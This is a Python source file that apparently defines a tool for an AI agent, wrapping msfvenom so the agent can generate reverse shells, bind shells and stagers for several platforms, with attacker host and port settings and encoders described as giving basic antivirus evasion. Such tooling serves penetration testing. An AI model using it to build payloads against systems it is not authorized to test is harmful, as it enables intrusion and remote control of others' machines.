from __future__ import annotations
from typing import Any

from backend.agent.tools.base import BaseTool, ToolResult, OnOutputCallback
from backend.agent.tools import executor


class MsfvenomTool(BaseTool):
    name = "run_msfvenom"
    description = (
        "Run msfvenom to generate payloads for exploitation. "
        "Creates reverse shells, bind shells, and stagers for Windows, Linux, macOS, Android, and web. "
        "Output to file or stdout in various formats (exe, elf, php, python, powershell, etc)."
    )
    parameters = {
        "type": "object",
        "properties": {
            "payload": {
                "type": "string",
                "description": "Payload name e.g. 'windows/x64/meterpreter/reverse_tcp', 'linux/x86/shell_reverse_tcp', 'php/meterpreter/reverse_tcp'",
            },
            "lhost": {
                "type": "string",
                "description": "Local/attacker IP address for reverse connections",
            },
            "lport": {
                "type": "integer",
                "description": "Local port to listen on (default 4444)",
            },
            "format": {
                "type": "string",
                "description": "Output format: exe, elf, raw, python, powershell, php, jsp, war, dll, msi, apk",
            },
            "output_file": {
                "type": "string",
                "description": "Save payload to this path e.g. /tmp/payload.exe",
            },
            "encoder": {
                "type": "string",
                "description": "Encoder to use e.g. 'x86/shikata_ga_nai' for basic AV evasion",
            },
            "iterations": {
                "type": "integer",
                "description": "Number of encoding iterations (default 1)",
            },
        },
        "required": ["payload", "lhost"],
    }

    async def run(
        self,
        on_output: OnOutputCallback,
        payload: str,
        lhost: str,
        lport: int = 4444,
        format: str = "exe",
        output_file: str | None = None,
        encoder: str | None = None,
        iterations: int = 1,
        **_: Any,
    ) -> ToolResult:
        args = [
            "msfvenom", "-p", payload,
            f"LHOST={lhost}", f"LPORT={lport}",
            "-f", format,
        ]
        if encoder:
            args += ["-e", encoder, "-i", str(iterations)]
        if output_file:
            args += ["-o", output_file]
        return await executor.execute(self.name, args, on_output, timeout=120)
